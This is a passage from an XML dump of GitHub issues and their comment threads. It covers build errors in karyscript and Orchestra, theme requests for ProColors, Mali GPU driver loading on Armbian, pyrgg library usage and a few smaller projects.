npm ERR! spawn ENOENT&#13;
npm ERR! &#13;
npm ERR! Failed at the karyscript@0.0.1 after-core-pack script 'node ./build/after-pack-for-web.js'.&#13;
npm ERR! Make sure you have the latest version of node.js and npm installed.&#13;
npm ERR! If you do, this is most likely a problem with the karyscript package,&#13;
npm ERR! not with npm itself.&#13;
npm ERR! Tell the author that this fails on your system:&#13;
npm ERR!     node ./build/after-pack-for-web.js&#13;
npm ERR! You can get information on how to open an issue for this project with:&#13;
npm ERR!     npm bugs karyscript&#13;
npm ERR! Or if that isn't available, you can get their info via:&#13;
npm ERR!     npm owner ls karyscript&#13;
npm ERR! There is likely additional logging output above.&#13;
&#13;
npm ERR! Please include the following file with any support request:&#13;
npm ERR!     /home/javad/Dev/karyscript/npm-debug.log&#13;
&#13;
npm ERR! Linux 4.4.0-64-generic&#13;
npm ERR! argv "/usr/bin/nodejs" "/usr/bin/npm" "run" "build-core"&#13;
npm ERR! node v4.2.6&#13;
npm ERR! npm  v3.5.2&#13;
npm ERR! code ELIFECYCLE&#13;
npm ERR! karyscript@0.0.1 build-core: `npm run compile-compiler; npm run compile-pegs; npm run pack-core; npm run after-core-pack`&#13;
npm ERR! Exit status 1&#13;
npm ERR! &#13;
npm ERR! Failed at the karyscript@0.0.1 build-core script 'npm run compile-compiler; npm run compile-pegs; npm run pack-core; npm run after-core-pack'.&#13;
npm ERR! Make sure you have the latest version of node.js and npm installed.&#13;
npm ERR! If you do, this is most likely a problem with the karyscript package,&#13;
npm ERR! not with npm itself.&#13;
npm ERR! Tell the author that this fails on your system:&#13;
npm ERR!     npm run compile-compiler; npm run compile-pegs; npm run pack-core; npm run after-core-pack&#13;
npm ERR! You can get information on how to open an issue for this project with:&#13;
npm ERR!     npm bugs karyscript&#13;
npm ERR! Or if that isn't available, you can get their info via:&#13;
npm ERR!     npm owner ls karyscript&#13;
npm ERR! There is likely additional logging output above.&#13;
&#13;
npm ERR! Please include the following file with any support request:&#13;
npm ERR!     /home/javad/Dev/karyscript/npm-debug.log&#13;
&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>@La-Volpe Okay in what command line are you runnig the code (ubuntu on windows, cmd, powershell or node.js command prompt?) and also can you run `node -v` on your shell and say what you see?</Body>
    </Comment>
  </Issue_870>
  <Issue_871>
    <Repository>Orchestra</Repository>
    <Title>Doesn't run on Windows</Title>
    <Owner>pmkary</Owner>
    <Body>During install:&#13;
```&#13;
npm install&#13;
npm WARN deprecated minimatch@2.0.10: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issue&#13;
npm WARN deprecated minimatch@0.2.14: Please update to minimatch 3.0.2 or higher to avoid a RegExp DoS issue&#13;
npm WARN deprecated graceful-fs@1.2.3: graceful-fs v3.0.0 and before will fail on node releases &gt;= v7.0. Please update to graceful-fs@^4.0.0 as soon as possible. Use 'npm ls graceful-fs' to find it in the tree.&#13;
```&#13;
```&#13;
npm run build&#13;
[15:43:30] Starting 'sheets'...&#13;
{ Error: Command failed: git rev-list --all --count &gt; _compiled/about/commit-count.txt&#13;
The system cannot find the path specified.&#13;
&#13;
    at ChildProcess.exithandler (child_process.js:198:12)&#13;
    at emitTwo (events.js:106:13)&#13;
    at ChildProcess.emit (events.js:191:7)&#13;
    at maybeClose (internal/child_process.js:891:16)&#13;
    at Socket.&lt;anonymous&gt; (internal/child_process.js:342:11)&#13;
    at emitOne (events.js:96:13)&#13;
    at Socket.emit (events.js:188:7)&#13;
    at Pipe._handle.close [as _onclose] (net.js:497:12)&#13;
  killed: false,&#13;
  code: 1,&#13;
  signal: null,&#13;
  cmd: 'git rev-list --all --count &gt; _compiled/about/commit-count.txt' }&#13;
[15:43:30] Finished 'sheets' after 187 ms&#13;
```&#13;
After install:&#13;
```&#13;
npm run electron&#13;
[1908:0811/154409.371:INFO:CONSOLE(290)] "Uncaught TypeError: Cannot read property 'submenu' of undefined", source: file:///C:/Users/user.name/Downloads/orchestra-master/_compiled/ui/menu.js (290)&#13;
[1908:0811/154409.407:INFO:CONSOLE(38)] "&#13;
%cOrchestra Studio %c&#915;&#199;&#243; Copyright 2016-present, Kary Foundation, Inc.&#13;
&#13;
", source: file:///C:/Users/user.name/Downloads/orchestra-master/_compiled/ui/window.js (38)&#13;
(node:1908) DeprecationWarning: Calling an asynchronous function without callback is deprecated.&#13;
[1908:0811/154409.551:INFO:CONSOLE(128)] "Uncaught TypeError: Assignment to constant variable.", source: file:///C:/Users/user.name/Downloads/orchestra-master/_compiled/ui/playground.js (128)&#13;
```&#13;
I get a nice blank screen with the Kary logo, and some nice, but nonfunctional stoplight buttons at the top, but no functional editor.&#13;
node version 6.11.2&#13;
npm version 3.10.10</Body>
    <State>open</State>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>Hello Nathan. Thanks a lot for your interesest in Orchestra.&#13;
&#13;
Currently Orchestra 1 is under super heavy development and only runs on `macOS`, there are a few things that needs to be implemented for Orchestra to run on Windows and Linux as I can mention here:&#13;
&#13;
- Build system must support windows. It doesn't for no. For example Electron Packer has no config for Windows and Linux right now&#13;
- Orchestra's window has no titlebar hence in windows and linux there must be no menu which means a few of the menubar commands that are still not in the ribbon view should be implemented and also the menu system must be disabled on Windows and Linux &#13;
&#13;
So they are unfortunately known issues. There are a few priorities that must be fixed or be implemented before I start implementing cross-platform features&#13;
&#13;
- Language must be stable (which includes [support for unicode](https://github.com/karyfoundation/orchestra/issues/11) that is a big task because of a compiler dependency)&#13;
- Compilers must be fully stables (Both OrchestraCore and Quartet compilers and compatible with latest unicode standards)&#13;
- File format needs to be stable&#13;
- Interface be effected with all the latest changes&#13;
&#13;
I think this list will take me till the end of this summer to happen as I'm hopping to release Orchestra to the public this fall. So I'll definitely come back to this problem and fix it but I really can't make any promises on when (maybe within a month or two hopefully) and I'm really hoping you'll be able to use and enjoy it.&#13;
&#13;
Again thanks a lot for your interest in Orchestra.&#13;
I hope my answer gave you a transparent insight on the development of Orchestra.</Body>
    </Comment>
  </Issue_871>
  <Issue_872>
    <Repository>ProColors</Repository>
    <Title>Nice to have ProColors theme for Intellij IDEA</Title>
    <Owner>pmkary</Owner>
    <Body>The excellent theme would be great to have this theme for IntelliJ IDEA</Body>
    <State>open</State>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>@mxmind thanks a lot for that! I designed the theme with a base to run on any editor. the [themeX](https://github.com/pmkary/themeX) project was designed for that. But then what happened was the theme got sophisticated in terms of supporting rich tokens and grammars. for now no editor but vscode/sublime-text/atom has a tokenizing engine as rich and therefore no editor but these can support the theme (at least they don't colorize that pretty) so I don't know, it seems for now we're stuck with only vscode</Body>
    </Comment>
  </Issue_872>
  <Issue_873>
    <Repository>ProColors</Repository>
    <Title>Ask for the theme on Mac iterm2 :)</Title>
    <Owner>pmkary</Owner>
    <Body>Hi, Vary appreciate for your theme, I love it very much.&#13;
But sadly I can't use it on Mac iterm2.  May you please add this theme for item2 ?</Body>
    <State>open</State>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>@WindSoilder hi! thanks for using Pro Colors :D &#13;
&#13;
A big problem with the terminals is they need two tones for each color (a dark and a bright one). Currently I don't have that for terminals. But I'm thinking about it because I want to have Pro Colors on the Terminal too. Once I figured out a good color match I will definitely release a Terminal version for a few of the famous ones including iTerm 2.</Body>
    </Comment>
  </Issue_873>
  <Issue_874>
    <Repository>ProColors</Repository>
    <Title>Appreciation &#10084;&#65039;</Title>
    <Owner>pmkary</Owner>
    <Body>No bugs here sorry! Just wanted to say thanks for your hard work!&#13;
&#13;
I love light themes but unfortunately they are very rare compared to dark themes and most of them are not pleasant and accessible like yours. You did a really good job! &#128293;</Body>
    <State>open</State>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>@jiayihu today I was really low and suddenly found this issue; I can't explain how much it meant to me. Your very kind words really made my day and changed my mood. thank you very much for that and I'm really happy that you like the themes. Me too [had the same problem with themes and programming tools](http://kary.us/2017/05/16/my-journey-to-clean-code/) and I'm glad that at some level my solution helped you too.</Body>
    </Comment>
    <Comment>
      <Owner>jiayihu</Owner>
      <Body>I'm happily using your theme for about ~6months, so I really appreciate the effort you put into it. Anyway if you happen to be low take some time for yourself! </Body>
    </Comment>
    <Comment>
      <Owner>NlightNFotis</Owner>
      <Body>@pmkary  For what it's worth, I also want to state my happiness with the work done on this theme. It's awesome, keep it up. My favourite theme thus far, and part of why I have switched to vscode. Also appreciate the work you did on racket support.</Body>
    </Comment>
    <Comment>
      <Owner>pmkary</Owner>
      <Body>@NlightNFotis &amp;bullet; I though a long time how to respond, but truth is I have no idea! Your very kind words made my day&amp;mdash;just like how @jiayihu did&amp;mdash;there are days when I'm lost, or I feel what I do doesn't matter, and there's always very kinds words like yours that make me happy, bring meaning to what I do, and makes it worth doing. So thank you so much &#10084;&#65039; </Body>
    </Comment>
  </Issue_874>
  <Issue_875>
    <Repository>Magnificent-University-Projects</Repository>
    <Title>Syntax Error in Graphics1-OpenGL/in_class/j02-simple.cpp </Title>
    <Owner>mohsend</Owner>
    <Body>if you try to compile mentioned file you got following syntax error
j02-simple.cpp: In function &#8216;void display_stipple()&#8217;:
j02-simple.cpp:86:16: error: expected primary-expression before &#8216;,&#8217; token
  glLineStipple(,0x3C);
                ^
</Body>
    <State>open</State>
    <Comment>
      <Owner>mohsend</Owner>
      <Body>Would you kindly fix that and other errors in that directory (4 files have errors and won't compile) and send a pull request afterwards?
</Body>
    </Comment>
  </Issue_875>
  <Issue_876>
    <Repository>96-landing</Repository>
    <Title>is blue color good for hover ? (link in top menu)</Title>
    <Owner>mehrnooshdsht</Owner>
    <Body>when top menu don't have black background , right menu (&lt;a&gt;) have blue hover .&#13;
i think pink background is not good for blue text (link)</Body>
    <State>open</State>
    <Comment>
      <Owner>mehrnooshdsht</Owner>
      <Body>I agree with you and I prefer shades of grey or something like that. I would be glad if you implement your ideas and we can merge it then :)</Body>
    </Comment>
  </Issue_876>
  <Issue_877>
    <Repository>pride-90-bedun-rang</Repository>
    <Title>Chnaging license to MIT, now MIT will send me a Invitation</Title>
    <Owner>arastu</Owner>
    <Body>I think the MIT may need your "semeje Irani" attitude and I change the license to MIT.</Body>
    <State>open</State>
    <Comment>
      <Owner>arastu</Owner>
      <Body>Could you please also add unit tests around the update you have made?&#13;
@01sadra @pi0 </Body>
    </Comment>
  </Issue_877>
  <Issue_878>
    <Repository>pyrgg</Repository>
    <Title>import pyrgg as python library</Title>
    <Owner>sepandhaghighi</Owner>
    <Body>Hi,&#13;
&#13;
I am trying to use pyrgg with me own python application, could you please provide an example usage of importing pyrgg as a library in python?</Body>
    <State>open</State>
    <Comment>
      <Owner>sepandhaghighi</Owner>
      <Body>&gt; Hi,&#13;
&gt; &#13;
&gt; I am trying to use pyrgg with me own python application, could you please provide an example usage of importing pyrgg as a library in python?&#13;
&#13;
Hi&#13;
&#13;
`pyrgg` originally designed as a `CLI` application. &#13;
But you can call each function like this :&#13;
&#13;
```pycon&#13;
&gt;&gt;&gt; dimacs_maker(file_name="test",min_range=1,max_range=2,vertices=34,min_edge=2,max_edge=23,sign=1)&#13;
```&#13;
* We will improve this aspect of `pyrgg` in next release (next few months)&#13;
&#13;
</Body>
    </Comment>
  </Issue_878>
  <Issue_879>
    <Repository>pyrgg</Repository>
    <Title>Format</Title>
    <Owner>sepandhaghighi</Owner>
    <Body>Hi, are you going to support formats like MatrixMarket and SNAP? </Body>
    <State>open</State>
    <Comment>
      <Owner>sepandhaghighi</Owner>
      <Body>@fvella Hi ;-)&#13;
&#13;
These formats will be support in next release (next few weeks)</Body>
    </Comment>
  </Issue_879>
  <Issue_880>
    <Repository>r6p2</Repository>
    <Title>How to load the Mali GPU device driver?</Title>
    <Owner>mosajjal</Owner>
    <Body>There is first step in original readme `Load the Mali GPU device driver`. But how is it possible to do for example on mainline kernel 4.14 on H3 board with Armbian? `modprobe mali` say that there is no such module. In case if such module should be build by hands, could you please share any useful documentation/links, please?&#13;
&#13;
Thanks.</Body>
    <State>open</State>
    <Comment>
      <Owner>AbiuPlayer</Owner>
      <Body>Sorry but only in Italian.&#13;
See this guide for both kernel and userspace drivers&#13;
&#13;
http://abiuplayer.altervista.org/compilare-i-drivers-kernel-e-userspace-per-gpu-mali-su-allwinner-h3-e-h5/</Body>
    </Comment>
  </Issue_880>
  <Issue_881>
    <Repository>r6p2</Repository>
    <Title>Does it run on Armbian legacy kernel.</Title>
    <Owner>mosajjal</Owner>
    <Body>possible compile it on armbian kernel 3.4.x ?</Body>
    <State>open</State>
    <Comment>
      <Owner>mosajjal</Owner>
      <Body>In theory, yes. I haven't tested it personally on legacy kernel but there's no reason it won't work. Although I've specifically asked for mainline drivers and they gave me this one.</Body>
    </Comment>
    <Comment>
      <Owner>asakous</Owner>
      <Body>@mosajjal  thanks . I will test it sometime next month .</Body>
    </Comment>
    <Comment>
      <Owner>mosajjal</Owner>
      <Body>cool! Please share your experience when it's done :-) </Body>
    </Comment>
    <Comment>
      <Owner>asakous</Owner>
      <Body>mali.ko compiled . but fail to modprobe.  it can be insert module by using  --force parameter. unfortunately when I launch Retroarch it crashed. </Body>
    </Comment>
    <Comment>
      <Owner>mosajjal</Owner>
      <Body>I think you should have 3 `.ko` files. insert them in the right order and you'll have it. Better to put them inside `xorg` config because they have to be loaded before xorg</Body>
    </Comment>
    <Comment>
      <Owner>asakous</Owner>
      <Body>@mosajjal I run Retroarch  in framebuffer mode . so I only need 2 ko files. one is mali.ko another is ump.ko.&#13;
because of MODVERSIONS . so I can't build the right version of kernel module for my system. To solve my problem I need to recompile kernel and modules . that's too much to me. sorry for the bad result.</Body>
    </Comment>
    <Comment>
      <Owner>mosajjal</Owner>
      <Body>Too bad. Although I think you can download `armbian` and use their kernel and modules for RetroArch. Armbain comes with good performance drivers already shipped with it. Good luck :-)</Body>
    </Comment>
  </Issue_881>
  <Issue_882>
    <Repository>retwitgram</Repository>
    <Title>Superheavy image!</Title>
    <Owner>mostafaasadi</Owner>
    <Body>The image which you have used in README.md is just superheavy, over 1MB!</Body>
    <State>open</State>
    <Comment>
      <Owner>mostafaasadi</Owner>
      <Body>we have superlux internet also :)&#13;
I could not find a way to decrease its size withour loosing quality</Body>
    </Comment>
    <Comment>
      <Owner>farooqkz</Owner>
      <Body>yes that's it, you should decrease it's quality.&#13;
make it smaller, all details don't need to be visible. just an idea about your bot would be enough, isn't it?&#13;
P.S.:were you serious?about the superlux internet.</Body>
    </Comment>
    <Comment>
      <Owner>mostafaasadi</Owner>
      <Body>if you can decrease it and pull me i will be thankful&#13;
superlux In terms of price :)</Body>
    </Comment>
    <Comment>
      <Owner>farooqkz</Owner>
      <Body>me?probably no but I will give it a try. Also don't be lazy.&#13;
P.S.: yeah...&#13;
Edit:&#13;
You could use one of these "online convertors", use your prefered search engine to find one.</Body>
    </Comment>
  </Issue_882>
  <Issue_883>
    <Repository>Keystone.Net</Repository>
    <Title>cool!</Title>
    <Owner>chaplin89</Owner>
    <Body>wow, this is awesome! how complete is this?&#13;
&#13;
let me know, we can link to your binding from our homepage.&#13;
&#13;
keep it up, cheers.</Body>
    <State>open</State>
    <Comment>
      <Owner>chaplin89</Owner>
      <Body>Actually, It's missing the architectures specific error codes and a lot of tests. Also, the support for different version of the framework would be nice (and maybe a NuGet package).</Body>
    </Comment>
    <Comment>
      <Owner>aquynh</Owner>
      <Body>nice, thanks for the info.&#13;
&#13;
just in case, there is a pull req for new C# binding added to the main repo at https://github.com/keystone-engine/keystone/pull/278&#13;
&#13;
cheers.</Body>
    </Comment>
    <Comment>
      <Owner>chaplin89</Owner>
      <Body>Ok, that's fine. I needed bindings for Keystone in a .NET project so I created my own, I didn't see the pr. Eventually, I'll delete this repo when the PR will be integrated in Keystone.</Body>
    </Comment>
  </Issue_883>
</root>
